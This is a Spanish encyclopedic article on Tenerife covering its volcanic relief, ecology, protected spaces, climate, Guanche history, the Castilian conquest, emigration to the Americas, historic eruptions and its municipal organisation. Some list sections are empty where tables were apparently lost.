Las principales estructuras de Tenerife, que a continuación se describen, conforman el edificio central, con el complejo Teide-Pico Viejo y el circo de Las Cañadas. Se trata de una semicaldera de 130 kilómetros cuadrados, que ha sido originada por un conjunto de procesos geológicos explicados en el epígrafe "Origen y formación". El circo está parcialmente ocupado por el estratovolcán Teide-Pico Viejo y completado por los materiales que ha emitido en sus diferentes erupciones. Destacan en su interior los Roques de García, entre los que está el más conocido, el Roque Cinchado. Otra formación llamativa son Los Azulejos, compuesto por fonolitas de colores verdosos que se han creado por actividad hidrotermal.

Al sur de La Caldera destaca la Montaña de Guajara, que con 2.718 metros es la de mayor altitud de las que constituyen el anfiteatro de Las Cañadas del Teide. Al pie de estas paredes se han creado llanos endorreicos de materiales sedimentarios muy finos, siendo el más conocido el Llano de Ucanca.
El Pico del Teide, con 3.718 metros sobre el nivel del mar y más de 7.000 sobre el fondo oceánico, es el punto más elevado de la isla, del territorio español y de todas las tierras emergidas del Atlántico. Este volcán, el tercero más grande del planeta desde su base, es el símbolo de Tenerife por antonomasia y el monumento natural más emblemático del Archipiélago Canario. Su situación central, sus importantes dimensiones, su silueta y su paisaje nevado lo dotan de una singular personalidad. Ya los aborígenes guanches lo consideraban lugar de culto y adoración.

Desde 1954, el Teide y todo el circo de su alrededor (aunque hubo una ampliación posterior de sus límites) está declarado como Parque nacional. Además, desde junio de 2007 está incluido por la Unesco dentro de los espacios Patrimonio de la Humanidad como bien natural.
Al oeste se encuentra el volcán Pico Viejo. En un lateral de este, se encuentra el Volcán de Chahorra o Narices del Teide, donde se produjo la última erupción que se ha dado en el entorno del Teide, en 1798.

El macizo de Anaga, en el extremo nororiental de la isla, posee un perfil topográfico irregular y escabroso donde a pesar de no presentar grandes cotas, destaca la Cruz de Taborno con 1.024 metros. Debido a la antigüedad de sus materiales (5,7 m a.), a sus profundos procesos erosivos y a la densa red de diques que atraviesan el macizo, son numerosos los roques que aparecen en superficie, tanto de etiología fonolítica como traquítica. Existe una gran cantidad de barrancos escarpados y muy encajados en el terreno. En la costa de Anaga predominan los acantilados, por lo que existe un número escaso de playas; no obstante, las que hay suelen coincidir con zonas de desembocadura de barrancos, algunas de rocas y otras de arena negra.

El macizo de Teno se encuentra en el extremo noroccidental. Al igual que en Anaga, se trata de una zona de estructuras desmanteladas y hondos barrancos que se han originado por erosión. Sin embargo, aquí los materiales son más antiguos (aproximadamente 7,4 m. a.). Destacan la Montaña de Gala que con 1.342 metros representa la mayor altitud. El paisaje más singular de este Macizo se encuentra en su costa sur. Se trata de los Acantilados de Los Gigantes, con paredes verticales que llegan a alcanzar en algunos puntos los 500 metros de altura.

El macizo de Adeje se sitúa en el extremo meridional de la isla, teniendo como mayor exponente al Roque del Conde, con 1.001 metros de altitud. El macizo no es tan apreciable por su reducida estructura inicial, hecho que añadido a la historia geológica del lugar ha potenciado un intenso desmantelamiento de sus materiales, perdiendo de ese modo su aspecto y envergadura original.
La Cordillera Dorsal o dorsal de Pedro Gil abarca desde el principio del monte de La Esperanza, a unos 750 metros de altitud aproximadamente, hasta la zona central de la isla, en las inmediaciones de la Caldera de Las Cañadas, siendo Izaña, su punto más alto, con 2.350 metros sobre el nivel del mar. Esta estructura se ha constituido a expensas de un vulcanismo fisural de tipo basáltico a través de uno de los ejes o directrices estructurales que han dado origen al vulcanismo de la isla.

La dorsal de Abeque se encuentra formada por una cadena de volcanes que unen el macizo de Teno con el edificio central insular Teide-Pico Viejo a partir de otro de los tres ejes o directrices estructurales de Tenerife. A esta dorsal pertenece el volcán histórico de Chinyero cuya última erupción se registró en 1909.

La dorsal Sur o dorsal de Adeje está al amparo del último de los ejes estructurales. Destacan los restos de su macizo como formación primigenia, así como las alineaciones de pequeños conos volcánicos y de roques esparcidos por toda esta zona del sur tinerfeño.

La dorsal de Anaga divide naturalmente la región del macizo de Anaga de este a oeste. Separa los valles de San Andrés (al sur) y Taganana (al norte).

Los valles son otra de las formas de relieve más destacadas. Los más importantes son el Valle de La Orotava y el Valle de Güímar que se han generado por el deslizamiento en masa de grandes cantidades de materiales hacia el mar, creando una hondonada en el terreno.
Existen otros valles que se distribuyen por diversos enclaves de la geografía de Tenerife, aunque, en este caso, de diferente naturaleza. Suelen ser valles intercolinares que se han conformado tras el depósito de mayor cantidad de materiales geológicos en lomas laterales, o simplemente cauces amplios de determinados barrancos que en su evolución han tomado el aspecto de típicos valles.

Tenerife, debido principalmente a su gran altitud y a su silueta en semejanza a un tejado de dos aguas, está surcada por gran cantidad de barrancos. Estos constituyen uno de los elementos más característicos de su paisaje, originados por la erosión ejercida por la escorrentía superficial a lo largo de la historia. Destacan los barrancos de Ruiz, Fasnia y Güímar, el barranco del Infierno y Erques, todos ellos declarados espacios naturales protegidos por las instituciones canarias.

Las costas son, por lo general, accidentadas y abruptas, aunque lo son más en la zona norte que en la sur. No obstante 67,14 kilómetros de la costa tinerfeña lo representan playas, solo superada en este aspecto por la isla de Fuerteventura.
En el litoral septentrional son frecuentes las playas de cantos rodados o de arena negra, mientras que en la vertiente sur y suroeste de la isla predominan las playas con arenas más finas y de tonalidades más claras. Para más información puedes consultar el artículo .

Los tubos de lava, o tubos volcánicos, son cuevas volcánicas, usualmente con forma de túneles, formados en el interior de coladas lávicas más o menos fluidas mientras dura la actividad reogenética. Entre los muchos tubos volcánicos existentes en la isla destaca la llamada Cueva del Viento, situada en el municipio norteño de Icod de los Vinos, que es el tubo volcánico más grande de Europa y uno de los más grande del mundo, aunque durante mucho tiempo fue considerado incluso el más grande del mundo.

La isla de Tenerife disfruta de una notable diversidad ecológica pese a su reducida superficie, lo que es consecuencia de unas condiciones ambientales especiales, ya que la accidentada orografía reinante modifica localmente las condiciones climáticas generales, originando una gran variedad de microclimas. Esta vasta existencia de microclimas y, por lo tanto, de hábitat naturales, se hace manifiesta en la vegetación insular, constituida por una flora rica y variada (1400 especies de plantas superiores), entre las que destacan numerosos endemismos canarios (200) y exclusivamente tinerfeños (140).

Al concentrar este patrimonio vegetal de unas 140 especies exclusivas, la isla de Tenerife muestra la mayor relación de endemismos florísticos de la denominada Macaronesia. Además, la diferente composición química de los diversos materiales volcánicos que han construido el edificio insular, siempre bajo la acción combinada de los factores climáticos, da lugar a una gran diversidad de suelos. La conjunción de estos agentes determina la presencia de múltiples hábitats que albergan numerosas comunidades de plantas y animales que constituyen los singulares ecosistemas de Tenerife.

El estudio de la flora y la fauna tinerfeña puede realizarse de un modo más ordenado si es clasificada según los diferentes pisos ecológicos en los que se divide el terreno de la isla. Dicha división atiende especialmente a la orientación norte o sur de las vertientes de la isla y, por supuesto, a la altitud:



Aún faltaría hablar de la extensa fauna marina de entre la que destacan viejas, meros, abades, salemas, samas, pargos, etc. Gran interés tienen también la tortuga boba y las colonias permanentes de ballenas y delfines que habitan el litoral sur de la isla.
Tenerife posee un inventario faunístico que asciende a 56 especies de aves, 13 de mamíferos terrestres, 5 de reptiles, varios miles de invertebrados, 2 de anfibios y 400 de peces además de algunas especies de tortugas marinas y cetáceos.

Antes de la llegada de los aborígenes, las Islas Canarias y en especial la isla de Tenerife, estaba habitada por animales endémicos prehistóricos extintos en la actualidad en su mayoría. Estos especímenes alcanzaban tamaños superiores a lo habitual, esto es lo que se llama "Gigantismo insular".

Entre estas especies, las más conocidas que se encontraban en Tenerife eran;




Prácticamente la mitad de la isla (48,6%), se encuentra bajo las diferentes fórmulas de protección que atribuyen la Red Canaria de Espacios Naturales Protegidos. De los 146 espacios naturales recogidos por la citada red en el conjunto del archipiélago, un total de 43 se encuentran en Tenerife, siendo de este modo la isla que mayor número de espacios posee. Asimismo, atendiendo al porcentaje de territorio protegido con el que cada isla contribuye al total del archipiélago, hay que destacar que es Tenerife con un 37% la isla que encabeza la tabla. La Red contempla hasta ocho categorías de protección distintas, todas ellas representadas en la isla: aparte del parque nacional del Teide, cuenta con el mayor parque natural de Canarias (Corona Forestal), dos parques rurales (Anaga y Teno), cuatro reservas naturales integrales, seis reservas naturales especiales, un total de catorce monumentos naturales, nueve paisajes protegidos y hasta seis sitios de interés científico. El 9 de junio de 2015 el macizo de Anaga fue declarado reserva de la biosfera por la Unesco. El macizo de Anaga es el lugar que mayor cantidad de endemismos tiene en Europa.

El municipio de La Orotava, en gran parte a expensas del Parque nacional del Teide, y el de Santa Cruz de Tenerife que hace lo propio con el Parque Rural de Anaga presentan, respectivamente, el 76% y el 74% de su extensión bajo protección. De la misma forma, el emplazamiento mayoritario del Parque Rural de Teno al amparo del municipio de Buenavista del Norte hace que éste disponga de una importante parte de su superficie protegida.

La relación completa de los espacios protegidos de Tenerife es la que sigue:









A Tenerife se la conoce internacionalmente como la "Isla de la Eterna Primavera". La atribución de esta denominación climática se produce en gran medida gracias a los vientos alisios, cuya humedad, principalmente, se condensa en las zonas de medianías del norte y nordeste insular, constituyendo amplios mares de nubes que se disponen preferentemente entre los 600 y 1.800 metros de altura.

Otro factor que influye en la suavidad del clima de las Islas con respecto al que por latitud correspondería (Desierto del Sahara), es la corriente marina fría de Canarias, que enfría la temperatura de las aguas que bañan las costas y playas isleñas con respecto a la ambiental. Por último, la propia orografía tinerfeña también habría que tenerla en cuenta en esta terna de agentes encargados de hacer realidad el anteriormente citado eslogan.

A grandes rasgos, el clima de Tenerife es moderado, templado y muy suave en cualquier estación del año. No hay períodos de frío pero tampoco los hay de calor asfixiante. Las temperaturas medias son de 18 °C en invierno y 25 °C en verano, aunque estos sean valores relativos y generales. Evidentemente se producen importantes contrastes, como el que se produce durante los meses de invierno, en los cuales es posible disfrutar del sol en zonas de costa y, sin embargo, 3.000 metros por encima poder contemplar la blanca estampa nevada del Teide, lugar en el que nieva todos los años.
Otro ejemplo de contraste climático lo encontraríamos en la ciudad de Santa Cruz con respecto a la ciudad de La Laguna. Municipios unidos físicamente pero distanciados en cuanto a condiciones climáticas. Generalmente Santa Cruz tiene durante todo el año un clima cálido con temperaturas sensiblemente superiores a las que se disfrutan en la aledaña La Laguna, donde frecuentemente hace un poco más de frío y existe mayor probabilidad de precipitaciones, y cuyo clima es similar a las medianías del norte de la península.

El norte y el sur de Tenerife poseen igualmente diferentes características climáticas. En barlovento se registra un 73% de las precipitaciones totales además, la humedad relativa del aire es superior y la insolación inferior. Los máximos pluviométricos se registran en barlovento a una altitud media entre 1.000-1.200 m, casi exclusivamente en los montes de La Orotava.

Pero quizás sea más significativo que todo el norte de la isla carezca de un espacio en el que la pluviosidad media sea inferior a los 250 mm anuales.
En cambio, en la vertiente sur de la isla los valores pluviales son significativamente menores. Los únicos reductos sureños que se salvan de esta situación son Masca y Güímar, probablemente debido a sus características físicas que posibilitan una mayor presencia del alisio.

A modo de anécdota es interesante saber que los médicos europeos, sobre todo ingleses y holandeses, del pasado siglo XIX elogiaban el clima del norte de Tenerife, y lo recomendaban a sus pacientes para aliviar dolencias de la edad y del aparato circulatorio.

El suelo volcánico de Tenerife, generalmente de carácter poroso y permeable es motivo para que una considerable fracción del agua procedente de la lluvia, unida a aquella producto de condensaciones en zonas boscosas y a la proveniente del deshielo de las cumbres más elevadas de la isla, se infiltre en el subsuelo.

La construcción de embalses y presas como principales métodos de obtención de agua está desaconsejada debido a las mencionadas condiciones geológicas, que no permiten el almacenamiento del preciado líquido en superficie, así como a la irregularidad de las precipitaciones.

De este modo, la mayor parte del agua (90%) procede de pozos y principalmente de galerías, importantes sistemas que sirven para extraer el recurso hídrico del acuífero. Tenerife dispone en la actualidad de más de un millar de galerías perforadas.

La compleja formación y evolución geológica de Tenerife, en conjunción con las distintas características orográficas y bioclimáticas ofrecen como resultado una amplia gama de suelos atendiendo principalmente a su mayor o menor grado de evolución. En este sentido, se comportan como menos desarrollados, los suelos de las zonas expuestas al sur; sin embargo, las zonas al norte, afectadas por los vientos alisios, que aportan una gran humedad, muestran mayores niveles de evolución. Al ahondar en este capítulo resulta importante establecer una clasificación de los mismos en función de su capacidad de uso agrícola o no, así como sus limitaciones y los riesgos que implica.





Los guanches debieron llegar a Tenerife en un período comprendido desde antes del siglo V a.C. hasta el comienzo de la Era Cristiana. Durante casi dos mil años, poblaron la isla y trataron de adaptarse a sus particularidades medioambientales hasta que en 1496 fueron sometidos por las tropas españolas.

La Zona Arqueológica de la Cueva de los Guanches en el municipio de Icod de los Vinos, ha proporcionado las cronologías más antiguas de Canarias, con dataciones en torno al siglo a. C.

Respecto al nivel tecnológico, los guanches pueden ser encuadrados entre los pueblos de la edad de piedra, si bien esta terminología es rechazada debido a la ambigüedad que presenta. La cultura guanche se caracteriza por un desarrollo cultural avanzado, que posiblemente está en relación con los rasgos culturales bereberes importados desde el norte de África y un desarrollo tecnológico pobre, determinado por la escasez de materias primas, sobre todo de minerales que permitan la extracción de metales. Su actividad principal era el pastoreo, pero también se dedicaban a la agricultura, la recolección, la pesca, marisqueo de orilla o la artesanía.

En cuanto a las creencias, la religión guanche era politeísta aunque el culto astral estaba generalizado. Junto a él había una religiosidad animista que sacralizaba ciertos lugares, fundamentalmente roques y montañas. Entre los principales dioses guanches se podrían destacar; Achamán (dios del cielo y supremo creador), Chaxiraxi (diosa madre identificada más tarde con la Virgen de Candelaria), Magec (dios del sol) y Guayota (el demonio) entre otros muchos dioses y espíritus ancestrales. Especialmente singular era el culto a los muertos, practicándose la momificación de cadáveres. Además, en la isla han aparecido pequeñas figurillas líticas y de arcilla de tipo antropomorfo y zoomorfo asociadas a rituales, interpretados como ídolos. Destaca entre éstos el llamado Ídolo de Guatimac, el cuál se cree que representa a un genio o espíritu protector.

La sociedad guanche estaba dividida en estratos definidos por la riqueza, en cabezas de ganado especialmente, diferenciándose por un lado la nobleza y por otro el pueblo. La isla se dividía en territorios cuyo rey era el mencey (nombre dado al monarca de los guanches de Tenerife, que regía un menceyato o territorio). Unos cien años antes de la conquista, existía un mencey llamado Tinerfe el Grande, hijo del Mencey Sunta. Tinerfe tenía su corte en Adeje desde donde gobernaba toda la isla. A su muerte, sus nueve hijos se rebelaron y se repartieron la isla en nueve menceyatos y dos achimenceyatos independientes (llamados capitanías por los conquistadores). Los menceyatos y sus menceyes (por orden de descendencia) fueron los siguientes:

También se encontraba el Achimenceyato de Punta del Hidalgo gobernado por Aguahuco (el "Hidalgo pobre", hijo ilegítimo del Gran Tinerfe) y Zebenzui.

A pesar del tiempo transcurrido desde la conquista del Archipiélago aún hoy se mantienen muchos topónimos que nos recuerdan la lengua de los guanches. Son muchos los lugares que, aunque con importantes variaciones, conservan su denominación prehispánica.

La isla cuenta además con varias zonas arqueológicas de esta época anterior a la conquista. Por lo general, este patrimonio lo representan cuevas rupestres que si bien están repartidas por toda la geografía insular, la mayoría se encuentran en la vertiente meridional.

Dos de los más importantes yacimientos arqueológicos de la isla son: la Zona Arqueológica de la Cueva de los Guanches, donde se han encontrado los asentamientos más antiguos de Tenerife y ha proporcionado las cronologías más antiguas del archipiélago, con dataciones en torno al siglo a. C. y las llamadas Cuevas de Don Gaspar, por el hallazgo de restos vegetales en forma de semillas carbonizadas, la cuál constata la práctica de la agricultura en la isla de Tenerife en tiempos de los guanches. Ambos yacimientos se encuentran en el municipio de Icod de los Vinos.

Otros yacimientos importantes a destacar son la Zona Arqueológica Los Cambados y la Zona Arqueológica de El Barranco del Rey ambas en el municipio de Arona. También podríamos destacar la Cueva de Achbinico (primer santuario mariano de Canarias, de época guanche-castellana) y lugar este donde han aparecido diversos utensilios arqueológicos de época guanche muy anteriores a la conquista. Otro lugar de gran interés arqueológico es el Macizo de Anaga, esta zona de la isla es uno de los lugares más ricos en hallazgos arqueológicos de Canarias. Se han hallado gran cantidad de momias guanches en este lugar así como cuevas con algunos restos de animales momificados, y piedras con inscripciones como la llamada "Piedra de Anaga". Al otro lado de la isla en el municipio de El Tanque se encontró otra piedra con inscripciones la "Piedra Zanata" que parece haber estado relacionada con el mundo mágico-religioso de los guanches. Además en la isla se encuentran las controvertidas Pirámides de Güímar, de las cuáles hay muchas hipótesis sobre su construcción, aunque aún no se ha dado una definición oficial sobre su origen.

Existen además en Tenerife vestigios que revelan la presencia púnica en la isla, como sucede en la estela llamada comúnmente ""Piedra de los Guanches"" en la localidad de Taganana. Este yacimiento arqueológico se compone de una estructura formada por un bloque de piedra de grandes dimensiones, al aire libre, que presenta grabados rupestres en su superficie. Entre éstos, destaca la presencia de una representación de la diosa cartaginesa Tanit, representada mediante un símbolo en forma de "botella" rodeada de motivos cruciformes. Se piensa que el monumento se trataba originalmente de un ara de sacrificio vinculada a las que se encuentran en el ámbito semita y posteriormente reutilizada para el ritual aborigen de la momificación.

Tenerife fue la última isla de Canarias en ser conquistada y la que más tiempo tardó en someterse a las tropas castellanas. Aunque las fechas tradicionales de conquista de Tenerife se establecen entre 1494 (desembarco de Alonso Fernández de Lugo) y 1496 (conquista de la isla), hay que tener en cuenta que los intentos de anexionar la isla de Tenerife a la Corona de Castilla se remontan al menos a 1464. Desde el primer intento de conquistar la isla en 1464, hasta que se conquista definitivamente en 1496 transcurren 32 años.

Ese año de 1464, tiene lugar en el barranco del Bufadero la toma de posesión simbólica de la isla por el Señor de las Canarias Diego García de Herrera. Este firma un tratado de paz con los menceyes, permitiéndole poco después el mencey de Anaga construir una torre en sus tierras, donde guanches y europeos tienen tratos hasta que es demolida hacia 1472 por los mismos guanches.

En 1492 el gobernador de Gran Canaria Francisco Maldonado organiza una razia que termina en desastre para los europeos, pues son derrotados por los guanches de Anaga.

En diciembre de 1493, Alonso Fernández de Lugo obtuvo de los Reyes Católicos la confirmación de sus derechos de conquista sobre la isla de Tenerife. En abril de 1494, y procedente de Gran Canaria, desembarcó el conquistador en la costa de la actual Santa Cruz de Tenerife con una tropa de peninsulares y canarios (gomeros y grancanarios, sobre todo) formada por unos dos mil hombres de a pie y 200 a caballo. Tras levantar un fortín se dispuso a adentrarse hacia el interior de la isla.

Los menceyes de la isla de Tenerife tomaron distintas posturas en el momento de la conquista. Se constituyeron así el "bando de paz" y el "bando de guerra", integrado el primero por los menceyatos de, Güímar, Abona y Adeje, y el segundo por Anaga, Tegueste, Tacoronte, Taoro, Icoden y Daute. El bando opositor se enfrentó tenazmente a los castellanos de modo que la conquista tinerfeña se prolongó durante dos años. Las tropas castellanas sufrieron una derrota a manos de los guanches en la Primera Batalla de Acentejo en 1494. Sin embargo, los guanches, superados por la tecnología y por las nuevas enfermedades a las cuales no eran inmunes, cayeron frente a las tropas de la Corona de Castilla en la Batalla de Aguere y en la Segunda Batalla de Acentejo culminando la conquista en septiembre de 1496.

Como en el resto de las Islas, muchos de los aborígenes fueron esclavizados, especialmente los pertenecientes al "bando de guerra", mientras que buena parte de la población indígena sucumbió a enfermedades importadas como la gripe y, probablemente, la viruela, enfermedades infecciosas para las que aquella sociedad neolítica, debido a su aislamiento, no había desarrollado su sistema inmune. Tras la conquista, y especialmente durante el siglo posterior a ella, se fue produciendo una repoblación y colonización paulatina de la isla con la llegada de inmigrantes provenientes de diversos territorios pertenecientes al incipiente Imperio Español (Portugal, Flandes, Italia, Alemania).

Los bosques de Tenerife se vieron gradualmente afectados por el crecimiento poblacional y por la consecuente necesidad obtener terrenos despejados que permitieran la explotación agrícola para consumo propio y para la exportación. Así fue el caso de la introducción del cultivo de la caña de azúcar a principios del siglo XVI mientras que, en siglos sucesivos, la economía de la isla se centró en el aprovechamiento de otros cultivos tales como la vid y la cochinilla para fabricar tintes, así como el plátano.

Durante el siglo XVIII tras la Guerra de Sucesión española se desarrolla en Canarias el llamado ""comercio canario-americano"", el cual estaba regulado por una Real Cédula de 1697. Esta concedía el comercio canario con América por espacio de ocho años y lo limitaba a 1.000 toneladas. A Tenerife le correspondían 600, a La Palma 300 y 100 a Gran Canaria.

Tenerife era en este sentido la isla hegemónica, pues superaba el 50% del número de navíos y el 60% del tonelaje. En las islas de La Palma y Gran Canaria el porcentaje giraba en torno al 19% para la primera y el 7% en la segunda. Se desconoce el volumen del tráfico entre las Indias y Canarias, pero debió de ser muy importante y estaba concentrado casi exclusivamente en Tenerife.

Entre los productos que se exportaban destacaban: la cochinilla, el ron, y la caña de azúcar, los cuáles eran desembarcados principalmente en los puertos americanos de La Guaira, La Habana, Campeche y Veracruz. La importancia de Tenerife supuso el impulso decisivo del puerto de Santa Cruz de Tenerife, que se convirtió en el único puerto comercial de la isla, superando en importancia a los de Garachico y Puerto de la Cruz en el comercio indiano.

Muchos navegantes tinerfeños se sumaron a este comercio marítimo transcontinental, entre los que destacan el corsario Amaro Rodríguez Felipe, más comúnmente conocido como "Amaro Pargo". Su participación en la carrera de Indias comenzó en el bienio 1703-1705. Fue capitán de la fragata "El Ave María y las Ánimas", navío con el que navegó desde el puerto de Santa Cruz de Tenerife hasta el de La Habana. Entre otros importantes marinos tinerfeños de la época destacan también, Juan Pedro Dujardín y Bernardo de Espinosa, ambos compañeros de Amaro Pargo.

Con la aplicación general del libre comercio en 1778 y la Guerra de Independencia de los Estados Unidos, supuso la paralización total del tráfico, hasta la paz de 1783. A partir de aquí esta ruta comercial comenzó a decaer. A finales del siglo XVIII y principios del siglo XIX, el comercio canario-americano tomó su fin debido a una etapa de gran conflictividad bélica entre países que paralizó por varios años el comercio.

Tenerife fue atacada, como las otras islas, por corsarios de varias nacionalidades (franceses, ingleses, holandeses y berberiscos) varias veces a lo largo de su historia, según el devenir de las alianzas y guerras de España. De entre estos ataques destaca por su lugar en la historia el ataque de los británicos de 1797.

El 25 de julio, el almirante Horatio Nelson atacó Santa Cruz de Tenerife, capital de la isla y Jefatura de la Capitanía General. Tras un feroz ataque, la defensa organizada por el General Gutiérrez repelió a los británicos. Nelson perdió su brazo derecho por una bala de cañón (dice la leyenda que del "cañón Tigre") mientras intentaba desembarcar en la orilla de la costa de la zona de Paso Alto.

El 5 de septiembre, otro intento de desembarco en la región de Puerto Santiago fue repelido por los habitantes del Valle de Santiago del Teide, que lanzaron piedras a los británicos desde lo alto de los acantilados de Los Gigantes.

Otros corsarios, principalmente ingleses, también atacaron la isla de Tenerife con mayor o menor suerte, Robert Blake (1656), Walter Raleigh, John Hawkins, John Genings (1706), Woodes Rogers, entre otros.

Tenerife, del mismo modo que otras islas, ha guardado una estrecha relación con América. Desde los inicios del proceso de colonización del nuevo mundo, fueron varias las expediciones que antes de surcar el Atlántico hicieron escala en la isla y sumaron al pasaje numerosos tinerfeños que formaron parte integrante de las expediciones de conquista o que simplemente partieron en busca de mejores garantías de futuro rumbo al continente americano. A su vez, independientemente del tránsito humano fue importante el intercambio de especies animales y vegetales que se estableció entre las dos tierras.

Tras un siglo y medio de relativo crecimiento alrededor del año 1670 el complicado comercio exterior del sector vitivinícola propició la emigración de muchas familias especialmente hacia Venezuela y Cuba. Además por esas fechas surgió el interés por parte de la Corona de poblar aquellas zonas vacías de América a fin de evitar su ocupación por otras potencias, como había ocurrido en el caso de los ingleses con Jamaica o los franceses con las Guayanas o el oeste de La Española, de manera que también importantes remesas de canarios y entre ellos tinerfeños partieron hacia el nuevo destino colombino. La creciente agricultura cacaotera en Venezuela y tabaquera en Cuba, de finales del siglo XVII y principios del XVIII, contribuyó a la despoblación casi íntegra de localidades como Buenavista del Norte, Vilaflor o El Sauzal. Testimonio de la historia emigrante de la isla fue la fundación en las afueras de Santo Domingo del poblado de San Carlos de Tenerife en 1684. Este poblado fundado esencialmente por tinerfeños se creó con un claro objetivo estratégico ya que permitía preservar la ciudad del asedio de los franceses establecidos en la parte occidental de la isla de La Española. Entre 1720 y 1730 fueron trasladadas por la Corona 176 familias canarias, entre ellas numerosas tinerfeñas a la isla caribeña de Puerto Rico. En 1726, en torno a 25 familias isleñas emigraron a América para terminar fundando la ciudad de Montevideo. Cuatro años más tarde, en 1730, partió otro grupo que, al año siguiente, fundó la ciudad de San Antonio de Texas, en (Estados Unidos). Luego, entre 1777 y 1783, el puerto de Santa Cruz de Tenerife despidió a los fundadores de San Bernardo, en el estado de Luisiana, y también a algunas remesas con rumbo a Florida.

Debido a los problemas económicos derivados de la escasez de materias primas y de la lejanía con respecto a Europa, la emigración al continente americano, eminentemente a Cuba y Venezuela, continuó en los siglos XIX y principios del XX. Desde hace décadas, con las nuevas políticas de protección de la economía canaria y con el auge de la industria turística la dinámica migratoria se ha invertido, y hoy es Tenerife la que atiende el retorno de estos isleños, sus descendientes y otros inmigrantes perdurando así el influjo que germinó cinco siglos atrás.

Las erupciones volcánicas acontecidas en Tenerife de las que se tiene indudable constancia histórica se limitan a cinco. La primera de ellas fue en 1492 en el volcán Boca Cangrejo que fue observada por Cristóbal Colón. La siguiente ocurrió en el año 1704, cuando entraron en erupción, de forma sincrónica, los volcanes de Arafo, Fasnia y Siete Fuentes. Dos años más tarde, en 1706, tuvo lugar la erupción de mayor magnitud de las históricas al entrar en erupción el volcán de Trevejo. Este arrojó grandes cantidades de lava que sepultaron la ciudad y puerto de Garachico, en aquel entonces el más importante de la isla. La última erupción volcánica del siglo XVIII se produjo en 1798 en las Cañadas de Teide, concretamente en Chahorra. Finalmente, en 1909 la actividad eruptiva irrumpió en el volcán de Chinyero, en el municipio de Santiago del Teide. Posteriormente a esa fecha y hasta la actualidad no se han producido nuevas erupciones en la isla. Además, a pesar de la naturaleza absolutamente volcánica de Tenerife, los cinco episodios eruptivos históricos no han ocasionado víctima mortal alguna.

Otros visitantes menos hostiles llegarían a la isla en siglos sucesivos. En 1799 el naturalista Alexander von Humboldt ascendió el pico del Teide y comentó la belleza de la isla.

Numerosos turistas comenzaron a visitar Tenerife a partir de la década de 1890, especialmente las ciudades norteñas de Puerto de la Cruz (primer municipio turístico de Canarias mediante orden ministerial del 13 de octubre de 1955 que lo declaró ’Lugar de Interés Turístico’) y Santa Cruz de Tenerife.

En marzo de 1936, el general Francisco Franco fue destinado a Tenerife por el gobierno republicano, temeroso de su influencia militar y política, con el fin de alejarlo de los centros de poder.

La colisión entre dos aviones ocurrida el 27 de marzo de 1977 en el aeropuerto de Tenerife Norte, al norte de la isla, sigue siendo el accidente con mayor número de muertos de la historia de la aviación. Los aviones implicados en la tragedia tenían como destino Gran Canaria, pero habían sido desviados a Tenerife debido a la explosión de una bomba (supuestamente colocada por el grupo terrorista separatista MPAIAC) en el aeropuerto grancanario.

El gentilicio formal es "tinerfeño/a", aunque también de manera coloquial se utiliza la denominación "Chicharrero/a". Sin embargo, este último se reserva en la propia isla para los habitantes de la capital, Santa Cruz.

El gentilicio "chicharrero" procede de un término despectivo empleado por los habitantes de la cercana ciudad de La Laguna, entonces capital de la isla, para los habitantes del entonces pobre y pequeño puerto de pescadores. Justamente por dicha pobreza, los habitantes de Santa Cruz debían conformarse con comer chicharros, un pescado pequeño y barato de relativa baja calidad; de donde procede el término. Con el tiempo y el crecimiento de Santa Cruz, hasta conseguir el traslado de la capitalidad desde La Laguna, bajo el reinado de Fernando VII (siglo XIX), sus ciudadanos tomaron el insulto a honra y asumieron como propio el gentilicio.

La bandera de Tenerife fue adoptada originariamente en 1845 a modo de distintivo o bandera de matrícula de la que en aquel entonces se denominaba provincia marítima de Canarias con base en el Puerto de Santa Cruz de Tenerife. En la actualidad, esta enseña representa a toda la isla de Tenerife. Fue aprobada a instancia del Cabildo Insular por Orden del Gobierno de Canarias el 9 de mayo de 1989 y publicada el 22 de mayo de 1989 en el Boletín Oficial de Canarias.

El escudo heráldico de Tenerife fue otorgado mediante diploma real el 23 de marzo de 1510, concedido por el Rey Don Fernando V "El Católico", fue expedido en Madrid a nombre de su hija Doña Juana I, Reina de Castilla. El escudo se describe en campo de oro, con San Miguel Arcángel (pues la isla fue conquistada el día de San Miguel) armado superando a una montaña de su color natural de la que brotan llamas, y que representa al pico del Teide. Bajo esta montaña la isla de sinople sobre ondas azul y plata. A la derecha se observa un castillo de gules, y a la izquierda un león rampante de gules. El escudo que usa el Cabildo Insular se diferencia del que usa el Ayuntamiento de La Laguna en el lema que aparece en la bordura y en el añadido de unas ramas de palma.

Según una ley del Gobierno de Canarias los símbolos naturales de la isla son el pinzón azul y el drago.

El órgano de gobierno de la isla de Tenerife es el Cabildo Insular de Tenerife con sede en la Plaza de España de la capital tinerfeña (Palacio Insular de Tenerife). La organización política de Canarias se caracteriza porque no posee órgano político provincial sino que cada isla posee un cabildo insular propio. En Tenerife, su presidente en la actualidad es Carlos Enrique Alonso Rodríguez (Coalición Canaria). Desde que se constituyó en marzo de 1913 dispone de una amplia serie de competencias propias, hoy recogidas en el Estatuto de Autonomía de Canarias y reguladas por la Ley 14/1990, de 26 de julio, de Régimen Jurídico de las Administraciones Públicas de Canarias.

El Cabildo se compone de los siguientes órganos:


La isla de Tenerife está dividida en 31 municipios, por lo que es la isla canaria que más municipios posee.

De todos ellos, sólo tres no tienen costa: Tegueste, El Tanque y Vilaflor. La Orotava es el municipio de mayor altitud de España al albergar el pico del Teide, mientras que Vilaflor o Chasna tiene la capital municipal más alta de toda Canarias al estar a 1.400 metros de altitud.

El municipio más extenso con 207,31 km² es el de La Orotava, que abarca gran parte del Parque nacional del Teide. El municipio más pequeño de la isla y del archipiélago es Puerto de la Cruz, con una superficie inferior a los 9 km².

La gran mayoría de estos municipios confluyen en la zona de cumbre central de la isla y a partir de ahí se extienden hacia la costa, orientándose unos hacia el norte y otros hacia el sur.

A su vez, es frecuente encontrar otro tipo de división insular, es aquella que establece el territorio según una Zona Metropolitana, alrededor del área de influencia de las ciudades de Santa Cruz y La Laguna ("véase" Área metropolitana de Tenerife), Zona Norte (aquellos municipios que se abren al océano por el norte) y Zona Sur (aquellos que lo hacen hacia el sur). Esta división junto con la municipal se puede observar en el mapa de la derecha.

A continuación se muestra la relación de todos los municipios tinerfeños ordenados alfabéticamente:

